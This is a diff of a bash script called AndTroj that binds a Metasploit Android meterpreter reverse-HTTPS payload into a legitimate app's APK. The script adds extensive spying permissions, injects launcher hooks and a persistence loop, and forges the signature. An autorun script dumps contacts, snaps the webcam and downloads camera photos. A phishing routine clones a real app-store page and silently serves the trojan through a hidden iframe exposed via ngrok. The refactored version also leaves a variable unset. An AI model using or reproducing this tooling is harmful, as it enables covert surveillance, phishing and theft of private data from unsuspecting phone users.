@@ -1,199 +1,126 @@
 #!/bin/bash
-# ┌──(avi㉿unk9vvn)-[~]
-# └─$ sudo ./AndTroj.sh example.ddns.net imo-messenger.apk https://play.google.com/store/apps/details?id=com.imo.android.imoim
+ver='1.0'
 
 
+RED='\e[1;31m'
+GREEN='\e[1;32m'
+YELLOW='\e[1;33m'
+BLUE='\e[1;34m'
+CYAN='\e[1;36m'
+WHITE='\e[1;37m'
+NC='\e[0m'
 
-RED="\u001b[31m"
-CYAN="\u001b[36m"
-BLUE="\u001b[34m"
-GREEN="\u001b[32m"
-WHITE="\u001b[37m"
-YELLOW="\u001b[33m"
 
+# Check if running as root
+if [[ "$(id -u)" -ne 0 ]]; then
+    echo -e "${RED}[X] Please run as ROOT...${NC}"
+    echo -e "${GREEN}[*] Usage: sudo $0 APK URL${NC}"
+    exit 1
+fi
 
-version="74"
-apktool_version="2.6.1-dirty"
-TORRC=$(cat /etc/tor/torrc|grep -o "UseBridges 1")
-NoIP=$1
-APK=$2
-URL=$3
+# Check if two arguments are provided
+if [[ $# -ne 2 ]]; then
+    echo -e "${RED}[X] Please provide both APK and URL arguments!${NC}"
+    echo -e "${GREEN}[*] Usage: sudo $0 APK URL${NC}"
+    exit 1
+fi
+
+APK="$1"
+URL="$2"
+
+# Update system and install required packages
+echo -e "${GREEN}[*] Updating system and installing required packages...${NC}"
+apt update && apt upgrade -y && apt dist-upgrade -y && apt autoremove -y && apt autoclean -y
+apt install -y wget curl git net-tools gnupg apt-transport-https locate apktool metasploit-framework
+
+# Kill any running ngrok or ruby processes (ignore errors if not found)
+pkill -f 'ngrok\|ruby' || true
+
+# Initial variables
+USERS=$(ls /home)
+LAN=$(hostname -I | awk '{print $1}')
+OUTPUT=$(basename "$APK" .apk)
 ORGAPK="/tmp/original"
 PAYLOAD="/tmp/payload"
-OUTPUT=`echo $APK | cut -d "." -f 1`
-SCRIPT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" &> /dev/null && pwd)
-LAN=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | grep -v '169.*.*.*' | grep -v '192.168.56.*' | grep -v '192.168.236.*')
 
 
-# Checking Version
-if [ "$(curl -s https://raw.githubusercontent.com/a9v8i/AndTroj/main/version)" != "$version" ]; then
-	echo -e "$GREEN [*]$YELLOW Updating new version...$YELLOW"
-	git clone https://github.com/a9v8i/AndTroj.git /tmp/AndTroj
-	cp -r /tmp/AndTroj/* .
-	rm -r /tmp/AndTroj
-	echo -e "$GREEN [*]$YELLOW Updated... Please Try Again Script$YELLOW"
-	exit
-fi
-
-
-# Check Root and Args
-if [ "$(id -u)" != "0" ];then
-	echo -e "$RED [X]$YELLOW Please run as RooT ... $YELLOW"
-	echo -e "$GREEN [*]$YELLOW sudo chmod +x AndTroj.sh;sudo ./AndTroj.sh $YELLOW"
-	exit 0
-elif [ "$#" != "3" ]; then
-    echo -e "$RED [X]$YELLOW You Must Provide Three Args ... $YELLOW"
-    echo -e "$GREEN [*]$YELLOW sudo ./AndTroj.sh \$NoIP \$APK \$URL $YELLOW"
-    exit 0
-fi
-
-
-
-#-------------------------------OS Initial-------------------------------#
-
-
-
-# Install Tools
-if [[ ! -f "/usr/bin/git" ]];then
-	echo -e "$GREEN [*]$YELLOW Installing git $YELLOW"
-	apt-get install -y -qq git
-elif [[ ! -f "/usr/bin/tor" ]];then
-	echo -e "$GREEN [*]$YELLOW Installing tor $YELLOW"
-	apt-get install -y -qq tor
-elif [[ ! -f "/usr/bin/curl" ]];then
-	echo -e "$GREEN [*]$YELLOW Installing curl $YELLOW"
-	apt-get install -y -qq curl
-elif [[ ! -f "/usr/bin/apktool" ]];then
-	echo -e "$GREEN [*]$YELLOW Installing apktool $YELLOW"
-	apt-get install -y -qq apktool
-elif [[ ! -f "/usr/bin/proxychains" ]];then
-	echo -e "$GREEN [*]$YELLOW Installing proxychains $YELLOW"
-	apt-get install -y -qq proxychains
-elif [[ ! -f "/usr/bin/obfs4proxy" ]];then
-	echo -e "$GREEN [*]$YELLOW Installing obfs4proxy $YELLOW"
-	apt-get install -y -qq obfs4proxy
-elif [[ ! -f "/usr/bin/msfvenom" ]];then
-	echo -e "$GREEN [*]$YELLOW Installing msfvenom $YELLOW"
-	apt-get install -y -qq msfvenom
-elif [ "$(apktool -version)" != "$apktool_version" ];then
-	echo -e "$GREEN [*]$YELLOW Upgrading apktool to $apktool_version $YELLOW"
-	wget -q https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.6.1.jar -O /usr/local/bin/apktool.jar
-	wget -q https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool -O /usr/local/bin/apktool
-	chmod +x /usr/local/bin/apktool && chmod +x /usr/local/bin/apktool.jar
-elif [[ ! -f "/usr/local/bin/ngrok" ]];then
-	echo -e "$GREEN [*]$YELLOW Install Ngrok $YELLOW"
-	curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null &&
-	echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | tee /etc/apt/sources.list.d/ngrok.list &&
-	apt update -qq && apt install -qq ngrok
-	read -p ""$GREEN" [*]"$YELLOW" Enter Ngrok Token: "$YELLOW"" TOKEN
-	ngrok $TOKEN
-fi
-
-
-# Config Tor
-if [ "$TORRC" != "UseBridges 1" ]; then
-	echo "
-UseBridges 1
-ClientTransportPlugin obfs4 exec /usr/bin/obfs4proxy managed
-
-Bridge obfs4 178.17.170.33:4444 C2542268C0F438A725E5225781B689A33F12C495 cert=7V57ZSaOe59/oSbHNVyQaWyvtPYmGkb4Wy+MoDOuJDoR5czdc1YfaA8cMXD/unSy4ZNoXA iat-mode=0
-Bridge obfs4 46.43.1.48:9101 B6461B4E15C02BB8578E5BEAD24D4187F086EC73 cert=hoGthy5+DAGrnL4Iaf67SBUozXf6MecVGEhhwFHNBKnhxal76lGVv2rn/E76/vaPAB3pAA iat-mode=0
-Bridge obfs4 185.177.207.13:22662 98AD30401043993AFA64D776E13E7C2AA793C589 cert=p9L6+25s8bnfkye1ZxFeAE4mAGY7DH4Gaj7dxngIIzP9BtqrHHwZXdjMK0RVIQ34C7aqZw iat-mode=2" >> /etc/tor/torrc
-fi
-
-
-function BANNER()
+logo()
 {
-	clear
-	echo -e "$GREEN" "                            --/osssssssssssso/--                    "
-	echo -e "$GREEN" "                        -+sss+-+--os.yo:++/.o-/sss+-                "
-	echo -e "$GREEN" "                     /sy+++-.h.-dd++m+om/s.h.hy/:+oys/              "
-	echo -e "$GREEN" "                  .sy/// h/h-:d-y:/+-/+-+/-s/sodooh:///ys.          "
-	echo -e "$GREEN" "                -ys-ss/:y:so-/osssso++++osssso+.oo+/s-:o.sy-        "
-	echo -e "$GREEN" "              -ys:oossyo/+oyo/:-:.-:.:/.:/-.-:/syo/+/s+:oo:sy-      "
-	echo -e "$GREEN" "             /d/:-soh/-+ho-.:::--:- .os: -:-.:-/::sy+:+ysso+:d/     "
-	echo -e "$GREEN" "            sy-..+oo-+h:--:..hy+y/  :s+.  /y/sh..:/-:h+-oyss:.ys    "
-	echo -e "$WHITE" "           ys :+oo/:d/   .m-yyyo/- - -:   .+oyhy-N.   /d::yosd.sy   "
-	echo -e "$WHITE" "          oy.++++//d.  ::oNdyo:     .--.     :oyhN+-:  .d//s//y.ys  "
-	echo -e "$WHITE" "         :m-y+++//d-   dyyy++::-. -.o.-+.- .-::/+hsyd   -d/so+++.m: "
-	echo -e "$WHITE" "        -d/-/+++.m-  /.ohso- ://:///++++///://:  :odo.+  -m.syoo:/d-"
-	echo -e "$WHITE" "        :m-+++y:y+   smyms-   -//+/-ohho-/+//-    omsmo   +y s+oy-m:"
-	echo -e "$WHITE" "        sy:+++y-N-  -.dy+:...-- :: ./hh/. :: --...//hh.:  -N-o+/:-so"
-	echo -e "$WHITE" "        yo-///s-m   odohd.-.--:/o.-+/::/+-.o/:--.--hd:ho   m-s+++-+y"
-	echo -e "$WHITE" "        yo::/+o-m   -yNy/:  ...:+s.//:://.s+:...  :/yNs    m-h++++oy"
-	echo -e "$WHITE" "        oy/hsss-N-  oo:oN-   .-o.:ss:--:ss:.o-.   -My-oo  -N-o+++.so"
-	echo -e "$WHITE" "        :m :++y:y+   sNMy+: -+/:.--:////:--.:/+- -+hNNs   +y-o++o-m:"
-	echo -e "$WHITE" "        -d/::+o+.m-  -:/+ho:.       -//-       ./sdo::-  -m-o++++/d-"
-	echo -e "$WHITE" "         :m-yo++//d- -ommMo//        -:        +oyNhmo- -d//s+++-m: "
-	echo -e "$WHITE" "          oy /o++//d.  -::/oMss-   -+++s     :yNy+/:   .d//y+---ys  "
-	echo -e "$WHITE" "           ys--+o++:d/ -/sdmNysNs+/./-//-//hNyyNmmy+- /d-+y--::sy   "
-	echo -e "$RED" "            sy:..ooo-+h/--.-//odm/hNh--yNh+Ndo//-./:/h+-so+:+/ys      "
-	echo -e "$RED" "             /d-o.ssy+-+yo:/:/:-:+sho..ohs/-:://::oh+.h//syo-d/       "
-	echo -e "$RED" "              -ys-oosyss:/oyy//::..-.--.--:/.//syo+-ys//o/.sy-        "
-	echo -e "$RED" "                -ys.sooh+d-s:+osssysssosssssso:/+/h:/yy/.sy-          "
-	echo -e "$RED" "                  .sy/:os.h--d/o+-/+:o:/+.+o:d-y+h-o+-+ys.            "
-	echo -e "$RED" "                     :sy+:+ s//sy-y.-h-m/om:s-y.++/+ys/               "
-	echo -e "$RED" "                        -+sss+/o/ s--y.s+/:++-+sss+-                  "
-	echo -e "$RED" "                           --/osssssssssssso/--                       "
-	echo -e "$BLUE" "                                  Unk9vvN                            "
-	echo -e "$YELLOW" "                           https://unk9vvn.com                     "
-	echo -e "$CYAN" "                                  AndTroj                            "
-	echo -e "\n\n"
+    reset;clear
+    printf "$GREEN"   "                            --/osssssssssssso/--                    "
+    printf "$GREEN"   "                        -+sss+-+--os.yo:++/.o-/sss+-                "
+    printf "$GREEN"   "                     /sy+++-.h.-dd++m+om/s.h.hy/:+oys/              "
+    printf "$GREEN"   "                  .sy/// h/h-:d-y:/+-/+-+/-s/sodooh:///ys.          "
+    printf "$GREEN"   "                -ys-ss/:y:so-/osssso++++osssso+.oo+/s-:o.sy-        "
+    printf "$GREEN"   "              -ys:oossyo/+oyo/:-:.-:.:/.:/-.-:/syo/+/s+:oo:sy-      "
+    printf "$GREEN"   "             /d/:-soh/-+ho-.:::--:- .os: -:-.:-/::sy+:+ysso+:d/     "
+    printf "$GREEN"   "            sy-..+oo-+h:--:..hy+y/  :s+.  /y/sh..:/-:h+-oyss:.ys    "
+    printf "$WHITE"   "           ys :+oo/:d/   .m-yyyo/- - -:   .+oyhy-N.   /d::yosd.sy   "
+    printf "$WHITE"   "          oy.++++//d.  ::oNdyo:     .--.     :oyhN+-:  .d//s//y.ys  "
+    printf "$WHITE"   "         :m-y+++//d-   dyyy++::-. -.o.-+.- .-::/+hsyd   -d/so+++.m: "
+    printf "$WHITE"   "        -d/-/+++.m-  /.ohso- ://:///++++///://:  :odo.+  -m.syoo:/d-"
+    printf "$WHITE"   "        :m-+++y:y+   smyms-   -//+/-ohho-/+//-    omsmo   +y s+oy-m:"
+    printf "$WHITE"   "        sy:+++y-N-  -.dy+:...-- :: ./hh/. :: --...//hh.:  -N-o+/:-so"
+    printf "$WHITE"   "        yo-///s-m   odohd.-.--:/o.-+/::/+-.o/:--.--hd:ho   m-s+++-+y"
+    printf "$WHITE"   "        yo::/+o-m   -yNy/:  ...:+s.//:://.s+:...  :/yNs    m-h++++oy"
+    printf "$WHITE"   "        oy/hsss-N-  oo:oN-   .-o.:ss:--:ss:.o-.   -My-oo  -N-o+++.so"
+    printf "$WHITE"   "        :m :++y:y+   sNMy+: -+/:.--:////:--.:/+- -+hNNs   +y-o++o-m:"
+    printf "$WHITE"   "        -d/::+o+.m-  -:/+ho:.       -//-       ./sdo::-  -m-o++++/d-"
+    printf "$WHITE"   "         :m-yo++//d- -ommMo//        -:        +oyNhmo- -d//s+++-m: "
+    printf "$WHITE"   "          oy /o++//d.  -::/oMss-   -+++s     :yNy+/:   .d//y+---ys  "
+    printf "$WHITE"   "           ys--+o++:d/ -/sdmNysNs+/./-//-//hNyyNmmy+- /d-+y--::sy   "
+    printf "$RED"     "            sy:..ooo-+h/--.-//odm/hNh--yNh+Ndo//-./:/h+-so+:+/ys    "
+    printf "$RED"     "             /d-o.ssy+-+yo:/:/:-:+sho..ohs/-:://::oh+.h//syo-d/     "
+    printf "$RED"     "              -ys-oosyss:/oyy//::..-.--.--:/.//syo+-ys//o/.sy-      "
+    printf "$RED"     "                -ys.sooh+d-s:+osssysssosssssso:/+/h:/yy/.sy-        "
+    printf "$RED"     "                  .sy/:os.h--d/o+-/+:o:/+.+o:d-y+h-o+-+ys.          "
+    printf "$RED"     "                     :sy+:+ s//sy-y.-h-m/om:s-y.++/+ys/             "
+    printf "$RED"     "                        -+sss+/o/ s--y.s+/:++-+sss+-                "
+    printf "$RED"     "                            --/osssssssssssso/--                    "
+    printf "$BLUE"    "                                  Unk9vvN                           "
+    printf "$YELLOW"  "                            https://unk9vvn.com                     "
+    printf "$CYAN"    "                               AndTroj "$ver"                       "
+    printf "\n\n"
 }
 
 
-function join_by()
+join_by()
 {
-	local d=${1-} f=${2-}; if shift 2; then printf %s "$f" "${@/#/$d}"; fi;
+    local delimiter="$1"
+    shift
+    printf %s "$1" "${@/#/$delimiter}"
 }
 
 
-#-------------------------------APK Binder-------------------------------#
-
-
-function BINDER()
+binder()
 {	
-	for i in $(seq 1 7); do
-		a[$i]=`cat /proc/sys/kernel/random/uuid | sed 's/[-]//g' | head -c 20; echo;`
-	done
+    local i
+    # Generate random strings using uuidgen
+    local -a RAND=()
+    for i in {1..7}; do
+        RAND+=("$(uuidgen | tr -d '-' | head -c 20)")
+    done
+    local RAND_DIR="${RAND[1]}"
+    local RAND_MAINBRAD="${RAND[2]}"
+    local RAND_PAYLOAD="${RAND[3]}"
+    local RAND_MainService="${RAND[4]}"
 
-	RAND=(${a[@]})
-	RAND_DIR=${RAND[1]}
-	RAND_MAINBRAD=${RAND[2]}
-	RAND_PAYLOAD=${RAND[3]}
-	RAND_MainService=${RAND[4]}
+    # Generate payload APK using msfvenom
+    msfvenom --platform android -a dalvik -p android/meterpreter/reverse_https LHOST="$NoIP" LPORT=443 -o /tmp/payload.apk
+    apktool d -f /tmp/payload.apk -o "$PAYLOAD"
+    rm -f /tmp/payload.apk
 
-	# Check Directorys
-	if [ -d "$ORGAPK" ]; then
-		rm -r $ORGAPK
-	elif [ -d "$PAYLOAD" ]; then
-		rm -r $PAYLOAD
-	fi
-
-	echo -e "$GREEN [*]$YELLOW Generate Metasploit APK: LHOST: $NoIP PORT:443$YELLOW"
-	service postgresql start
-	msfvenom --platform android -a dalvik -p android/meterpreter/reverse_https LHOST=$NoIP LPORT=443 -o /tmp/payload.apk
-	BANNER
-	echo -e "$GREEN [*]$YELLOW Generate Metasploit APK: LHOST: $NoIP PORT:443$YELLOW"
-	echo -e "$GREEN [*]$YELLOW Decompile: payload.apk $WHITE"
-	apktool -f d /tmp/payload.apk -o $PAYLOAD > /dev/null
-	rm /tmp/payload.apk
-	echo -e "$GREEN [*]$YELLOW Decompile: $APK $YELLOW"
-	apktool -f d $APK -o $ORGAPK > /dev/null
-
-	if [ ! -d "$ORGAPK/smali/com" ];then 
-		mkdir "$ORGAPK/smali/com"
-	fi
-
+    # Decode the original APK
+    apktool d -f "$APK" -o "$ORGAPK"
+    mkdir -p "$ORGAPK/smali/com"
 
 	# Change Android API Version
-	echo -e "$GREEN [*]$YELLOW Change Android API Version$WHITE"
+	printf "${GREEN}[*] sChange Android API Version\n"
 	PACKAGE=`head -n 1 ${ORGAPK}/AndroidManifest.xml | sed -r 's/.*package="([^"]*)".*/\1/'`
 	sed -i "1s#.*#<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\"?><manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"$PACKAGE\" platformBuildVersionCode=\"31\" platformBuildVersionName=\"12\">#" "${ORGAPK}/AndroidManifest.xml"
 
-
 	# Set Permissions
-	echo -e "$GREEN [*]$YELLOW Set Permissions$WHITE"
+	printf "${GREEN}[*] Set Permissions\n"
 	permissions=(INTERNET ACCESS_WIFI_STATE CHANGE_WIFI_STATE ACCESS_NETWORK_STATE ACCESS_COARSE_LOCATION ACCESS_FINE_LOCATION READ_PHONE_STATE SEND_SMS RECEIVE_SMS RECORD_AUDIO CALL_PHONE READ_CONTACTS WRITE_CONTACTS RECORD_AUDIO WRITE_SETTINGS CAMERA READ_SMS WRITE_EXTERNAL_STORAGE RECEIVE_BOOT_COMPLETED SET_WALLPAPER READ_CALL_LOG WRITE_CALL_LOG WAKE_LOCK)
 
 	for permission in "${permissions[@]}"; do 
@@ -280,14 +207,16 @@ function BINDER()
 		LAUNCHER_STARTER_NUM=`awk '/put-object/{ print NR }'  "$ORGAPK/$BACKUP_SMALI/${BACKUP//.//}.smali" | head -1`
 		sed -i "$LAUNCHER_STARTER_NUM a \ \ \ \ invoke-static\ {v0},\ Lcom/$CUSTOM_FOLDER$RAND_DIR/$RAND_MainService;->start()V" "$ORGAPK/$BACKUP_SMALI/${BACKUP//.//}.smali"
 	fi
-	echo "#!/bin/bash
+	cat > /tmp/persis.sh << EOF
+#!/bin/bash
 while true
 do am start --user 0 -a android.intent.action.MAIN -n ${LAUNCHER%.*}/.MainActivity
 sleep 600
-done" > /tmp/persis.sh
-
+done
+EOF
 	echo -e "$GREEN [*]$YELLOW Generate Persistent$WHITE"
-	echo "upload /tmp/persis.sh
+	cat > /tmp/autoand.rc << EOF
+upload /tmp/persis.sh
 execute -f \"sh persis.sh\"
 sysinfo
 check_root
@@ -301,8 +230,8 @@ dump_contacts
 webcam_snap
 cd ../../../../../
 cd /sdcard/DCIM/Camera
-download -r *" > /tmp/autoand.rc
-
+download -r *
+EOF
 	echo -e "$GREEN [*]$YELLOW Rebinding $OUTPUT $WHITE"
 	apktool b $ORGAPK > /dev/null
 
@@ -340,38 +269,80 @@ download -r *" > /tmp/autoand.rc
 	mv $ORGAPK/dist/$OUTPUT.apk "$SCRIPT_DIR/$OUTPUT-b.apk"
 	jarsigner -verbose -sigalg $CERT_SIG -digestalg $CERT_DIGEST -keystore /tmp/unk9vvn.keystore "$OUTPUT-b.apk" signing.key -storepass 12341234 > /dev/null
 	BANNER
-	echo -e "$GREEN [*]$YELLOW Generate Metasploit APK: LHOST: $NoIP PORT:443$YELLOW"
-	echo -e "$GREEN [*]$YELLOW Decompile: payload.apk $WHITE"
-	echo -e "$GREEN [*]$YELLOW Decompile: $APK $YELLOW"
-	echo -e "$GREEN [*]$YELLOW Change Android API Version$WHITE"
-	echo -e "$GREEN [*]$YELLOW Set Permissions$WHITE"
-	echo -e "$GREEN [*]$YELLOW Hooking Launchers$WHITE"
-	echo -e "$GREEN [*]$YELLOW Generate Persistent$WHITE"
-	echo -e "$GREEN [*]$YELLOW Rebinding $OUTPUT $WHITE"
-	echo -e "$GREEN [*]$YELLOW Forged Signatures$WHITE"
-	echo -e "$GREEN [*]$YELLOW Launching Msfconsole Listening$WHITE"
-	xfce4-terminal --tab --command 'msfconsole -qx "use multi/handler;set PAYLOAD android/meterpreter/reverse_https;set LHOST ' $NoIP ';set LPORT 443;set ReverseListenerBindAddress ' $LAN ';set AutoRunScript /tmp/autoand.rc;set AndroidWakelock true;exploit -j"'
+
+
+	msfconsole -qx "use multi/handler;set PAYLOAD android/meterpreter/reverse_https; \
+	set LHOST $NoIP;set LPORT 443;set ReverseListenerBindAddress $LAN; \
+	set AutoRunScript /tmp/autoand.rc;set AndroidWakelock true;exploit -j"
 }
 
 
-#-------------------------------Create Phising Page-------------------------------#
-
-
-function PHISHING()
+phishing()
 {
-	echo -e "$GREEN [*]$YELLOW initialize Phishing Page$WHITE"
-	service tor start;service apache2 start
-	mv "$OUTPUT-b.apk" /var/www/html/
-	wget -O /var/www/html/index.html -c -k -q -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "$URL"
-	sed -i "s#</body>#<iframe id='frame' src='$OUTPUT-b.apk' application='yes' width=0 height=0 style='hidden' frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>\n<script type='text/javascript'>setTimeout(function(){window.location.href='$URL';}, 15000);</script>\n</body>#g" /var/www/html/index.html
-	proxychains ngrok http 80 > /dev/null
-	sleep 10
-	NGROK=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:\/\/([^"]*).*/\1/p')
-	echo -e "$GREEN [*]$YELLOW Send Phishing Link to TARGET: https://$NGROK$WHITE"
+	# start webserver
+	service apache2 start
+
+	# start ngrok
+	sleep 2
+	ngrok http 80 >/dev/null 2>&1 &
+	sleep 5
+	NGHOST=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r .tunnels[0].public_url | sed 's|https://||')
+	mv $OUTPUT-b.apk /var/www/html/
+	wget -O /var/www/html/index.html -c -k -q -U \
+	"Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" $URL
+
+	# inject iframe apk
+	sed -i "s|</body>|<iframe id='frame' src='$OUTPUT-b.apk' application='yes' width=0 height=0 style='display:none;' frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>\n<script type='text/javascript'>setTimeout(function(){window.location.href='$URL';}, 15000);</script>\n</body>|g" /var/www/html/index.html
+	printf "$GREEN"  "[*] Send Phishing Link to TARGET: $NGHOST"
 }
 
 
+main()
+{
+	# install ngrok
+	if [ ! -f "/usr/local/bin/ngrok" ]; then
+		name="ngrok"
+		wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz -O /tmp/$name.tgz
+		tar -xvzf /tmp/$name.tgz -C /usr/local/bin;rm -f /tmp/$name.tgz
+		chmod +x /usr/local/bin/ngrok
+		printf "$GREEN"  "[*] Successfully Installed $name"
+	fi
 
-BANNER
-BINDER
-PHISHING
+	# install noip2
+	if [ ! -f "/usr/local/bin/noip2" ]; then
+		name="noip"
+		mkdir -p /usr/share/$name
+		wget https://www.noip.com/client/linux/noip-duc-linux.tar.gz -O /tmp/$name.tar.gz
+		tar --strip-components=1 -xzf /tmp/$name.tar.gz -C /usr/share/$name;rm -f /tmp/$name.tar.gz
+		chmod 755 /usr/share/$name/*
+		cd /usr/share/$name;make;make install
+		printf "$GREEN"  "[*] Successfully Installed $name"
+	fi
+
+	# install atj
+	if [ ! -d "/usr/share/andtroj" ]; then
+		name="andtroj"
+		git clone https://github.com/a9v8i/AndTroj /usr/share/$name
+		chmod 755 /usr/share/$name/*
+		cat > /usr/bin/$name << EOF
+#!/bin/bash
+cd /usr/share/$name;bash atj.sh "\$@"
+EOF
+		chmod +x /usr/bin/$name
+		printf "$GREEN"  "[*] Successfully Installed $name"
+	elif [ "$(curl -s https://raw.githubusercontent.com/a9v8i/AndTroj/main/version)" != $ver ]; then
+		name="andtroj"
+		git clone https://github.com/a9v8i/AndTroj /usr/share/$name
+		chmod 755 /usr/share/$name/*
+		cat > /usr/bin/$name << EOF
+#!/bin/bash
+cd /usr/share/$name;bash atj.sh "\$@"
+EOF
+		chmod +x /usr/bin/$name
+		printf "$GREEN"  "[*] Successfully Updating $name"
+		bash /usr/share/$name/$name.sh
+	fi
+}
+
+
+main
